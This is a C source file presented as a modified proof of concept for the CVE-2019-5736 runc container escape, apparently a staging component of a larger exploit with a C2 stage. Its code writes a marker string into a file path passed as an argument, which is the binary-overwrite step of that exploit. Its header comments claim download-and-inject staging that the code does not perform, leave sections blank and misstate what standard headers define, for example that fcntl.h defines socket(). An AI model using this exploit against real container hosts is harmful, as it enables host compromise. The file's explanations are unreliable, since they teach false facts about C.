/* 
 * ==========================================
 * File: payloadstage.c
 * Author: Matthew Stacks
 * Organization: Rendition Infosec
 * Source Author: q3k
 * Description: Modified PoC of CVE-2019-5736 for internal use by Rendition Infosec
 * 
 * Execution of this exploit occurs in three parts:
 * -- 1. Payload Stager (payloadstage.c)
 *     Responsible for: 
 *        Downloading (Staging) the Payload Setter
 *        Injecting it into memory
 *        Passing execution to it
 *        
 * -- 2. Payload Setter (payloadset.c)
 *    Responsible for:
 * 
 * -- 3. C2 (c2.c)
 *    Responsible for:
 *
 * 
 * ==========================================
 */

/* 
 * ==========================================
 * Header Files
 * 
 * stdio.h
 *     Defines standard I/O process streams:
 *         stdin
 *         stdout
 *         stderr
 *         null
 *     Defines these functions:
 *         printf()
 *         snprintf()
 *         get()
 *         set()
 *
 * sys/types.h
 *     Defines standard system data types:
 *         void
 *         char
 *         char *ptr
 *         int
 *     Defines __attribute__ ((constructor))
 *
 * sys/stat.h
 *     Defines the format of data returned by system calls 
 *         stat()
 *         lstat()
 *         fstat()
 *
 * fcntl.h
 *     Defines functions that act on File Descriptors:
 *         open()
 *         socket()  
 *         pipe()
 *         read()
 *         write()
 *     
 * errno.h
 *     Defines macros for reporting and retrieving error conditions using errno
 *
 * string.h
 *     Defines a number of functions that allow manipulation of string data
 * 
 * netcat.c
 *     The netcat utility
 *     Included here because of its usefulness
 * 
 * ================================
 */

#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <errno.h>
#include <string.h>
#include <netcat.c>

/*
 * ================================
 *    
 * 
 *    
 * 
 *    
 * 
 * ================================
 */

int main(int argc, char **argv) {
    printf("HAX2: argv: %s\n", argv[1]);
    int fd = open(argv[1], O_RDWR|O_APPEND);
    printf("HAX2: fd: %d\n", fd);

    const char *poc = "cve-2019-5736";
    int res = write(fd, poc, strlen(poc));
    printf("HAX2: res: %d, %d\n", res, errno);
}
